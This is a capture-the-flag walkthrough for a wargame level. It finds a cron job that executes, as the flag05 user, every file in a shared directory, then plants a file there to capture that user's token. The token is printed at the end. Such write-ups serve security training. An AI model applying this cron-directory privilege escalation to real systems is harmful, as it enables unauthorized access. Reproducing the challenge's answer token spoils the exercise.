# Level 05

## 🔍 Reconnaissance

### Mail Check
When we logged into the system, we were notified of a mail message. To find mail files:

```bash
find / -name mail 2>/dev/null
```

### Crontab Analysis
We found a file in `/var/mail/level05` that looks like a crontab:

```bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

### Script Analysis
Contents of `/usr/sbin/openarenaserver` script:

```bash
#!/bin/sh
for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

## 💡 Vulnerability Analysis
1. Script runs every 2 minutes as flag05 user
2. Executes all files in `/opt/openarenaserver/` directory
3. Files are automatically deleted after execution

## ⚡ Exploit

1. Preparing the exploit script:
```bash
Created a file in /opt/openarenaserver/ and wrote /bin/getflag > /tmp/pass into it.
```

2. After waiting 2 minutes:
```bash
cat /tmp/pass
Check flag.Here is your token : viuaaale9huek52boumoomioc
```